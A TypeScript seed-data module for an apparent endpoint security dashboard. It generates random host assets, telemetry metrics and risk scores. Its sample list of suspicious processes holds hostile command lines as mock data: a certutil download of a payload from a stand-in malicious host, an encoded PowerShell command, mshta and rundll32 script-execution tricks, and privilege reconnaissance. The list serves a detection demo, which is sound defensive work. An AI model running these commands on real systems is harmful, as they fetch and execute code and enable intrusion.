import { storage } from "./storage";
import type { EndpointAsset, EndpointTelemetry } from "@shared/schema";

function randInt(min: number, max: number): number {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randFloat(min: number, max: number, decimals = 1): number {
  return parseFloat((Math.random() * (max - min) + min).toFixed(decimals));
}

function pick<T>(arr: T[]): T {
  return arr[Math.floor(Math.random() * arr.length)];
}

function recentDate(hoursBack: number): string {
  const d = new Date();
  d.setHours(d.getHours() - randInt(0, hoursBack));
  return d.toISOString();
}

const ENDPOINT_TEMPLATES: Array<{
  hostname: string;
  os: string;
  osVersion: string;
  tags: string[];
}> = [
  { hostname: "WS-FINANCE-01", os: "windows", osVersion: "Windows 11 23H2", tags: ["finance", "workstation"] },
  { hostname: "WS-FINANCE-02", os: "windows", osVersion: "Windows 11 23H2", tags: ["finance", "workstation"] },
  { hostname: "WS-DEV-03", os: "windows", osVersion: "Windows 11 22H2", tags: ["engineering", "workstation"] },
  { hostname: "LAPTOP-EXEC-02", os: "windows", osVersion: "Windows 11 23H2", tags: ["executive", "laptop"] },
  { hostname: "LAPTOP-SALES-01", os: "windows", osVersion: "Windows 10 22H2", tags: ["sales", "laptop"] },
  { hostname: "SRV-DC-01", os: "windows", osVersion: "Windows Server 2022", tags: ["server", "domain-controller", "production"] },
  { hostname: "SRV-SQL-02", os: "windows", osVersion: "Windows Server 2022", tags: ["server", "database", "production"] },
  { hostname: "SRV-WEB-01", os: "windows", osVersion: "Windows Server 2022", tags: ["server", "web", "production"] },
  { hostname: "LNX-WEB-01", os: "linux", osVersion: "Ubuntu 22.04 LTS", tags: ["server", "web", "production"] },
  { hostname: "LNX-DB-01", os: "linux", osVersion: "Ubuntu 22.04 LTS", tags: ["server", "database", "production"] },
  { hostname: "LNX-K8S-NODE-03", os: "linux", osVersion: "Ubuntu 24.04 LTS", tags: ["server", "kubernetes", "production"] },
  { hostname: "MAC-DESIGN-01", os: "macos", osVersion: "macOS Sonoma 14.3", tags: ["design", "workstation"] },
  { hostname: "MAC-EXEC-01", os: "macos", osVersion: "macOS Sonoma 14.4", tags: ["executive", "laptop"] },
];

const SUSPICIOUS_PROCESSES = [
  { name: "powershell.exe", user: "SYSTEM", cmdline: "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA" },
  { name: "cmd.exe", user: "SYSTEM", cmdline: "cmd.exe /c whoami /priv && net user" },
  { name: "certutil.exe", user: "admin", cmdline: "certutil.exe -urlcache -split -f http://malicious.example.com/payload.exe" },
  { name: "mshta.exe", user: "SYSTEM", cmdline: "mshta.exe vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run\")" },
  { name: "rundll32.exe", user: "SYSTEM", cmdline: "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\"" },
];

const TOP_DESTINATIONS = [
  "10.0.1.1", "10.0.1.254", "192.168.1.1", "api.microsoft.com",
  "update.microsoft.com", "crowdstrike.com", "github.com",
  "slack.com", "amazonaws.com", "login.microsoftonline.com",
];

export async function seedEndpointAssets(orgId: string): Promise<EndpointAsset[]> {
  const existing = await storage.getEndpointAssets(orgId);
  if (existing.length > 0) return existing;

  const count = randInt(8, 12);
  const shuffled = [...ENDPOINT_TEMPLATES].sort(() => Math.random() - 0.5).slice(0, count);

  const assets: EndpointAsset[] = [];
  for (const template of shuffled) {
    const statusRoll = Math.random();
    const agentStatus = statusRoll < 0.7 ? "online" : statusRoll < 0.9 ? "offline" : "degraded";

    const riskRoll = Math.random();
    const riskScore = riskRoll < 0.6 ? randInt(0, 30) : riskRoll < 0.85 ? randInt(31, 60) : randInt(61, 100);

    const octet2 = randInt(0, 255);
    const octet3 = randInt(0, 255);
    const octet4 = randInt(1, 254);
    const ipAddress = Math.random() < 0.7
      ? `10.${octet2}.${octet3}.${octet4}`
      : `192.168.${octet3}.${octet4}`;

    const asset = await storage.createEndpointAsset({
      orgId,
      hostname: template.hostname,
      os: template.os,
      osVersion: template.osVersion,
      agentVersion: `7.${randInt(10, 16)}.${randInt(0, 9)}`,
      agentStatus,
      ipAddress,
      macAddress: Array.from({ length: 6 }, () => randInt(0, 255).toString(16).padStart(2, "0")).join(":"),
      riskScore,
      tags: template.tags,
      metadata: {},
    });
    assets.push(asset);
  }

  return assets;
}

export async function generateTelemetry(orgId: string, assetId: string): Promise<EndpointTelemetry[]> {
  const telemetryRecords: EndpointTelemetry[] = [];

  const totalGb = pick([8, 16, 32]);
  const usedGb = randFloat(4, totalGb - 2, 1);
  const memPercent = Math.round((usedGb / totalGb) * 100);

  const diskTotal = pick([256, 512]);
  const diskUsed = randInt(80, diskTotal - 50);
  const diskPercent = Math.round((diskUsed / diskTotal) * 100);

  const suspiciousCount = randInt(0, 2);
  const suspiciousProcs = Array.from({ length: suspiciousCount }, () => ({
    ...pick(SUSPICIOUS_PROCESSES),
    pid: randInt(1000, 65535),
  }));

  const avOutdated = Math.random() < 0.2;
  const criticalPending = randInt(0, 3);

  const metrics: Array<{ type: string; value: unknown }> = [
    {
      type: "cpu",
      value: { usage: randInt(15, 85), cores: pick([4, 6, 8, 12, 16]) },
    },
    {
      type: "memory",
      value: { usedGb, totalGb, percent: memPercent },
    },
    {
      type: "disk",
      value: { usedGb: diskUsed, totalGb: diskTotal, percent: diskPercent },
    },
    {
      type: "process_count",
      value: { total: randInt(120, 350), suspicious: suspiciousCount },
    },
    {
      type: "suspicious_processes",
      value: { processes: suspiciousProcs },
    },
    {
      type: "av_status",
      value: {
        engine: pick(["CrowdStrike Falcon", "Microsoft Defender"]),
        lastScan: recentDate(48),
        definitions: avOutdated ? "outdated" : "up-to-date",
        threats: randInt(0, 2),
      },
    },
    {
      type: "patch_level",
      value: {
        installed: randInt(145, 210),
        pending: randInt(0, 15),
        critical_pending: criticalPending,
        lastCheck: recentDate(72),
      },
    },
    {
      type: "network_connections",
      value: {
        active: randInt(10, 50),
        suspicious: randInt(0, 2),
        topDestinations: Array.from({ length: randInt(3, 5) }, () => pick(TOP_DESTINATIONS)),
      },
    },
  ];

  for (const m of metrics) {
    const record = await storage.createEndpointTelemetry({
      orgId,
      assetId,
      metricType: m.type,
      metricValue: m.value as Record<string, unknown>,
    });
    telemetryRecords.push(record);
  }

  return telemetryRecords;
}

export async function calculateEndpointRisk(assetId: string): Promise<number> {
  const telemetry = await storage.getEndpointTelemetry(assetId);
  let risk = 0;

  for (const t of telemetry) {
    const val = t.metricValue as Record<string, any>;

    switch (t.metricType) {
      case "av_status":
        if (val.definitions === "outdated") risk += 20;
        break;
      case "patch_level":
        risk += (val.critical_pending || 0) * 15;
        break;
      case "suspicious_processes":
        if (Array.isArray(val.processes)) {
          risk += val.processes.length * 10;
        }
        break;
      case "cpu":
        if (val.usage > 80) risk += 5;
        break;
      case "network_connections":
        risk += (val.suspicious || 0) * 10;
        break;
    }
  }

  risk = Math.max(0, Math.min(100, risk));

  await storage.updateEndpointAsset(assetId, { riskScore: risk });

  return risk;
}
